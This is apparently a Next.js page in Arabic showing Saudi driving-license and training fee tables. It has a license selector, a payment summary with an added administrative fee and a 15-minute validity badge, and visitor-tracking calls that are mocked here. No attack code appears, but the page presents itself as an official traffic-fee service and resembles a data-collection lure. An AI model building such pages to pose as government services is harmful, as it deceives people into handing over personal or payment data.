"use client";

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import { useEffect, useState } from "react";
import { Badge } from "@/components/ui/badge";
import { Clock } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import Link from "next/link";

// Mock functions for demonstration purposes, as the original dependencies were not provided.
const setupOnlineStatus = (visitorId: string) =>
  console.log(`Setting up online status for ${visitorId}`);
const addData = (data: any) => console.log("Adding data:", data);

// ---------- New tables (exactly matching the images) ----------

type Row = {
  no: number;
  label: string;
  price: number | string;
  isAlt?: boolean;
  isTotal?: boolean;
  isVat?: boolean;
};

type FeeTable = {
  title: string;
  headers: [string, string, string];
  rows: Row[];
};

const tables: FeeTable[] = [
  {
    title: "",
    headers: ["#", "البنود", "الأسعار ( ريال )"],
    rows: [
      { no: 1, label: "اختبار نظري", price: 75, isAlt: false },
      {
        no: 2,
        label: "%15 ضريبة القيمة المضافة",
        price: 11.25,
        isAlt: true,
        isVat: true,
      },
      { no: 3, label: "المجموع", price: 86.25, isAlt: false, isTotal: true },
    ],
  },
  {
    title: "",
    headers: ["#", "البنود", "الأسعار ( ريال )"],
    rows: [
      { no: 1, label: "التدريب العملي (4 ساعات)", price: 300, isAlt: false },
      { no: 2, label: "اختبار عملي", price: 75, isAlt: false },
      {
        no: 3,
        label: "%15 ضريبة القيمة المضافة",
        price: 56.25,
        isAlt: true,
        isVat: true,
      },
      { no: 4, label: "المجموع", price: 431.25, isAlt: false, isTotal: true },
    ],
  },
  {
    title: "",
    headers: ["#", "البنود", "الأسعار ( ريال )"],
    rows: [
      { no: 1, label: "التدريب النظري (6 ساعات)", price: 450 },
      { no: 2, label: "التدريب العملي (22 ساعات)", price: 1650 },
      { no: 3, label: "محاكاة (ساعتين)", price: 150 },
      { no: 4, label: "اختبار نظري", price: 75 },
      { no: 5, label: "اختبار عملي", price: 75 },
      {
        no: 6,
        label: "%15 ضريبة القيمة المضافة",
        price: 360,
        isAlt: true,
        isVat: true,
      },
      { no: 7, label: "المجموع", price: "2,760.00", isTotal: true },
    ],
  },
  {
    title: "",
    headers: ["#", "البنود", "الأسعار ( ريال )"],
    rows: [
      { no: 1, label: "التدريب النظري (4 ساعات)", price: 300 },
      { no: 2, label: "التدريب العملي (10 ساعات)", price: 750 },
      { no: 3, label: "محاكاة (ساعة)", price: 75 },
      { no: 4, label: "اختبار نظري", price: 75 },
      { no: 5, label: "اختبار عملي", price: 75 },
      {
        no: 6,
        label: "%15 ضريبة القيمة المضافة",
        price: 191.25,
        isAlt: true,
        isVat: true,
      },
      { no: 7, label: "المجموع", price: 1466.25, isTotal: true },
    ],
  },
  {
    title: "",
    headers: ["#", "البنود", "الأسعار ( ريال )"],
    rows: [
      { no: 1, label: "التدريب النظري (4 ساعات)", price: 300 },
      { no: 2, label: "التدريب العملي (ساعتين)", price: 150 },
      { no: 3, label: "اختبار نظري", price: 75 },
      { no: 4, label: "اختبار عملي", price: 75 },
      {
        no: 5,
        label: "%15 ضريبة القيمة المضافة",
        price: 90,
        isAlt: true,
        isVat: true,
      },
      { no: 6, label: "المجموع", price: 690, isTotal: true },
    ],
  },
];

function PriceTable({ data }: { data: FeeTable }) {
  return (
    <div className="overflow-x-auto">
      <table className="min-w-full border-collapse border border-gray-300 rounded-lg overflow-hidden text-sm">
        <thead>
          <tr className="bg-green-700 text-white">
            {data.headers.map((h, i) => (
              <th
                key={i}
                className={`border border-gray-300 p-3 ${
                  i === 0 ? "w-14 text-center" : "text-right"
                }`}
              >
                {h}
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {data.rows.map((r, idx) => (
            <tr
              key={r.no}
              className={`${
                r.isAlt
                  ? "bg-slate-100"
                  : idx % 2 === 0
                  ? "bg-white"
                  : "bg-gray-50"
              }`}
            >
              <td className="border border-gray-300 p-3 text-center font-medium">
                {r.no}
              </td>
              <td
                className={`border border-gray-300 p-3 ${
                  r.isTotal ? "font-bold" : ""
                }`}
              >
                {r.label}
              </td>
              <td
                className={`border border-gray-300 p-3 text-left ${
                  r.isTotal ? "font-bold" : r.isVat ? "text-slate-800" : ""
                }`}
              >
                {typeof r.price === "number"
                  ? r.price.toLocaleString("ar-SA", {
                      minimumFractionDigits: 0,
                      maximumFractionDigits: 2,
                    })
                  : r.price}{" "}
                ريال
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function DrivingFeesPage() {
  useEffect(() => {
    const visitorId =
      localStorage.getItem("visitor") || `visitor_${Date.now()}`;
    if (!localStorage.getItem("visitor")) {
      localStorage.setItem("visitor", visitorId);
    }
    addData({ id: visitorId, currentPage: "اسعار" });
    setupOnlineStatus(visitorId!);
  }, []);

  const [formData, setFormData] = useState({
    licenseType: "",
  });

  const handleInputChange = (key: string, value: string) => {
    setFormData({ ...formData, [key]: value });
  };

  const getLicensePrice = (licenseType: string) => {
    const prices: { [key: string]: number } = {
      "private-40": 40,
      "public-40": 40,
      "commercial-100": 100,
      "motorcycle-20": 20,
      "temporary-100": 100,
      "car-basic-599": 599,
      "car-standard-799": 799,
      "car-premium-999": 999,
      "motorcycle-basic-499": 499,
      "truck-commercial-1999": 1999,
      "defensive-299": 299,
      "refresher-349": 349,
    };
    return prices[licenseType] || 0;
  };

  const getLicenseName = (licenseType: string) => {
    const names: { [key: string]: string } = {
      "private-40": "رخصة قيادة خاصة",
      "public-40": "رخصة قيادة عامة",
      "commercial-100": "رخصة قيادة مركبات أشغال عامة",
      "motorcycle-20": "رخصة قيادة دراجة آلية",
      "temporary-100": "تصريح قيادة مؤقت",
      "car-basic-599": "دورة السيارة الأساسية",
      "car-standard-799": "دورة السيارة القياسية",
      "car-premium-999": "دورة السيارة المميزة",
      "motorcycle-basic-499": "دورة الدراجة النارية الأساسية",
      "truck-commercial-1999": "دورة الشاحنة التجارية",
      "defensive-299": "دورة القيادة الدفاعية",
      "refresher-349": "دورة تنشيطية",
    };
    return names[licenseType] || "غير محدد";
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Page Header */}
      <div className="bg-green-800 text-white py-8 md:py-12">
        <div className="container mx-auto px-4 text-center">
          <h1 className="text-xl md:text-3xl font-bold mb-2 md:mb-4">
            جدول رسوم الخدمات المرورية
          </h1>
          <p className="text-sm md:text-base max-w-2xl mx-auto">
            رسوم رخص القيادة ونقل ملكية المركبات ولوحات المركبات بأنواعها
          </p>
        </div>
      </div>

      {/* License Type Selection */}
      <div className="container mx-auto px-4 py-6 md:py-8">
        <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 max-w-4xl mx-auto">
          <div className="space-y-4 md:space-y-6">
            <h3 className="text-base md:text-lg font-semibold text-slate-700 border-r-2 border-blue-500 pr-3">
              ابدأ إجراءاتك الآن
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
              <div className="space-y-2">
                <Label
                  htmlFor="licenseType"
                  className="text-sm font-medium text-slate-700"
                >
                  اختر نوع الرخصة *
                </Label>
                <Select
                  onValueChange={(value) =>
                    handleInputChange("licenseType", value)
                  }
                  required
                >
                  <SelectTrigger className="h-10 md:h-12 border-slate-200 focus:border-blue-500">
                    <SelectValue placeholder="اختر نوع الرخصة" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="private-40">
                      رخصة قيادة خاصة - 40 ريال
                    </SelectItem>
                    <SelectItem value="public-40">
                      رخصة قيادة عامة - 40 ريال
                    </SelectItem>
                    <SelectItem value="commercial-100">
                      رخصة قيادة مركبات أشغال عامة - 100 ريال
                    </SelectItem>
                    <SelectItem value="motorcycle-20">
                      رخصة قيادة دراجة آلية - 20 ريال
                    </SelectItem>
                    <SelectItem value="temporary-100">
                      تصريح قيادة مؤقت - 100 ريال
                    </SelectItem>
                    <SelectItem value="car-basic-599">
                      دورة السيارة الأساسية - 599 ريال
                    </SelectItem>
                    <SelectItem value="car-standard-799">
                      دورة السيارة القياسية - 799 ريال
                    </SelectItem>
                    <SelectItem value="car-premium-999">
                      دورة السيارة المميزة - 999 ريال
                    </SelectItem>
                    <SelectItem value="motorcycle-basic-499">
                      دورة الدراجة النارية الأساسية - 499 ريال
                    </SelectItem>
                    <SelectItem value="truck-commercial-1999">
                      دورة الشاحنة التجارية - 1999 ريال
                    </SelectItem>
                    <SelectItem value="defensive-299">
                      دورة القيادة الدفاعية - 299 ريال
                    </SelectItem>
                    <SelectItem value="refresher-349">
                      دورة تنشيطية - 349 ريال
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Payment Summary */}
              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 md:p-6 rounded-xl border border-blue-100">
                <div className="flex items-center justify-between mb-3 md:mb-4">
                  <span className="text-sm font-medium text-slate-600">
                    ملخص الدفع
                  </span>
                  <Badge variant="outline" className="text-xs">
                    <Clock className="h-3 w-3 ml-1" />
                    صالح لمدة 15 دقيقة
                  </Badge>
                </div>
                <div className="space-y-2">
                  {formData.licenseType && (
                    <div className="flex justify-between text-xs md:text-sm">
                      <span className="text-slate-600 truncate ml-2">
                        {getLicenseName(formData.licenseType)}
                      </span>
                      <span className="text-slate-900 font-medium">
                        {getLicensePrice(formData.licenseType)} ريال
                      </span>
                    </div>
                  )}
                  <div className="flex justify-between text-xs md:text-sm">
                    <span className="text-slate-600">رسوم إدارية</span>
                    <span className="text-slate-900">50 ريال</span>
                  </div>
                  <Separator className="my-2" />
                  <div className="flex justify-between items-center">
                    <span className="font-semibold text-slate-900 text-sm md:text-base">
                      المبلغ الإجمالي
                    </span>
                    <span className="text-lg md:text-2xl font-bold text-blue-600">
                      {formData.licenseType
                        ? getLicensePrice(formData.licenseType) + 50
                        : 50}{" "}
                      ريال
                    </span>
                  </div>
                </div>
              </div>
              <div className="md:col-span-2">
                <Link href={"/info"} className="w-full" passHref>
                  <Button
                    className="w-full bg-green-700 hover:bg-green-800 text-white py-3 text-lg"
                    disabled={!formData.licenseType}
                  >
                    متابعة لإدخال البيانات
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* --------- Replaced section: use the tables from the images --------- */}
      <div className="container mx-auto px-4 pb-12 space-y-6 md:space-y-8">
        <Card className="mx-4 md:mx-0">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="text-lg md:text-xl font-bold text-center">
              الجداول التفصيلية
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-8">
            {tables.map((t, idx) => (
              <div key={idx} className="max-w-2xl mx-auto">
                <PriceTable data={t} />
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Footer Note */}
        <div className="text-center text-gray-600 text-sm">
          <p>* الرسوم المذكورة أعلاه قابلة للتغيير حسب اللوائح الحكومية</p>
          <p>* يرجى مراجعة الجهات المختصة للحصول على أحدث المعلومات</p>
        </div>
      </div>
    </div>
  );
}
